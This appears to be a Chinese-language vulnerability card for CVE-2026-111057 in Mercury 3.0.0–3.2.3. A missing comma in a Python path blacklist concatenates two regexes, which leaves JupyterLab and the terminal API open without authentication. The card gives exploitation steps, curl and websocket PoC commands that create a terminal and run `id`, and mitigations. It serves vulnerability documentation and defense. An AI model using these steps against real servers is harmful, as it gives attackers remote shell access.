---
id: web-python-framework-mercury-blocklist-comma-terminal
title: Mercury 路径黑名单漏逗号导致 /lab 与终端接口未授权
type: scenario
domain: web
path: web/python/framework
technique: path-blacklist-implicit-string-concat
aliases:
- CVE-2026-111057
- Mercury 终端未授权
- Mercury /lab 未授权
- BLOCKED_PATTERNS 逗号
tags:
- mercury
- jupyter
- python
- blacklist
- path-bypass
- terminal
- lab
cve:
- CVE-2026-111057
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: 3.0.0 到 3.2.3
verification:
  verified_by: verifier-B
  verified_at: '2026-11-04T18:43:38+08:00'
  notes: 已对照原文逐节核对：逗号拼接原理、3.2.3 实测状态码、CVE-2026-111057 与版本区间均与正文及截图一致；未在本机复现实例（未验证点：未独立重放 /lab、/api/terminals）
---

## 一句话结论

Mercury 3.2.3 用一张路径黑名单保护 JupyterLab 与终端接口，但列表第一条正则末尾漏写逗号，Python 把相邻字符串字面量隐式拼接，导致 `/lab` 与 `/api/terminals` 两条规则同时失效；配合默认空 token 与关闭 XSRF，匿名访问者可直接打开 JupyterLab 界面并创建 pty 终端拿到 shell。

## 原理

1. **默认匿名**：`mercury_app/__main__.py` 在命令行和环境变量都没有 token 时注入 `--IdentityProvider.token=''`，Jupyter Server 因此不做身份校验；随后又因 token 为空追加 `--ServerApp.disable_check_xsrf=True`，POST 不再需要 XSRF 令牌。
2. **访问控制只剩黑名单**：`block_handler.py` 定义 `BLOCKED_PATTERNS`，`app.py` 将其转换为 `Rule` 插到默认路由之前，命中返回 403，未命中则交给 Jupyter 原生 handler。
3. **隐式拼接**：3.2.3 的列表写成了
   `r"/lab(...)(?:/.*)?"` 换行后紧跟 `r"/api/terminals(?:/.*)?"`，中间没有逗号。Python 将相邻字符串字面量直接拼接为一个字符串，于是第一条规则变成“以 `/lab` 开头并以 `/api/terminals` 结尾”的路径，实际请求 `/lab` 和 `/api/terminals` 都不匹配。
4. **后果**：`/lab` 返回完整 JupyterLab 前端，攻击者可在文件树中浏览 notebooks、打开终端、新建并运行 notebook；`POST /api/terminals` 直接创建伪终端，随后通过 `/terminals/websocket/<name>` 执行命令。
5. **修复不完整**：3.2.4 只补上逗号，恢复 `/lab` 与终端的 403；`/api/kernels` 仍匿名可用（另见关联卡片），`/api/contents` 在 3.2.4 上仍可匿名读写。

## 触发条件

- Mercury 3.0.0–3.2.3，默认配置且未设置 `--token` 或 `MERCURY_TOKEN`，也未配置密码；
- 服务可被攻击者访问：默认绑 127.0.0.1，但 Docker 端口映射、`--ip=0.0.0.0` 或反向代理会暴露；
- 未在反向代理层额外加认证；
- 目标使用 Jupyter 原生终端与 Lab 功能（默认开启）。

## 利用步骤

1. 访问 `http://target:8888/lab`，若返回 JupyterLab 页面而非 403，说明黑名单已失效；
2. 直接 `POST /api/terminals` 创建一个伪终端，响应返回自增名称；
3. 连接 `ws://target:8888/terminals/websocket/<name>`，首帧为 `["setup", {}]`；
4. 发送 `["stdin", "id\n"]`，从 `["stdout", "..."]` 读取命令结果；
5. 也可通过 `/lab` 界面的文件树读取 notebooks 目录、打开终端或新建 notebook 执行代码；
6. 终端与内核权限继承 Mercury 服务进程；官方 Docker 部署中为容器 root。

## PoC

```text
# 判断 /lab 是否仍开放
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8888/lab
200

# 创建终端
curl -s -X POST http://127.0.0.1:8888/api/terminals
{"name": "1", "last_activity": "2026-10-23T09:40:18.998580Z"}
```

```text
# 连接 ws://127.0.0.1:8888/terminals/websocket/1
[+] 首帧: ["setup", {}]
[<] 发送: ["stdin", "id\n"]
[<] 回显: ["stdout", "uid=1000(ubuntu) gid=1001(ubuntu) ...\r\n"]
```

```python
# 复现隐式拼接：列表实际只有 3 条规则，但第一条已不是原意
patterns = [
    r"/lab(?!/(?:extensions/|api/settings(?:/|$)|api/translations(?:/|$)))(?:/.*)?"
    r"/api/terminals(?:/.*)?",
    r"/api/shutdown(?:/.*)?",
    r"/files(?:/.*)?",
]
print(len(patterns))  # 3，而不是预期的 4
```

## 变体与关联

- 变体：3.2.4 上 `/api/contents` 仍可匿名列目录与写文件，可与内核接口组合；`/api/shutdown`、`/files` 两条规则未受影响。
- 关联：[[web-python-framework-mercury-unauth-jupyter-kernel-rce]]（同一产品的内核接口未授权）；[[code-analysis-vuln-discovery-python-adjacent-string-concat]]（逗号缺陷的通用审计模式）。
- 注意：公开公告只描述 `/api/terminals`，`/lab` 同时失守是作者实测补充；两者根因相同。

## 检测与防御

- **升级**：升到 3.2.5 及以上，不要停在只修逗号的 3.2.4。
- **认证**：设置 `MERCURY_TOKEN` 或 `--token`，启用密码；反向代理再加一层认证。
- **网络**：只绑 127.0.0.1，禁止将 8888 直接映射到公网。
- **检测**：匿名 `GET /lab` 返回 200；`POST /api/terminals` 与 `/terminals/websocket/` 连接；服务进程派生异常 `sh`/`bash`；`/api/contents` 的匿名 PUT。
- **代码审计**：对安全规则列表检查相邻字符串字面量、断言规则数量与逐条匹配测试，不要依赖肉眼。
- **设计**：黑名单无法覆盖完整 Jupyter 接口面，应默认拒绝并用服务端执行清单限制可执行内容。
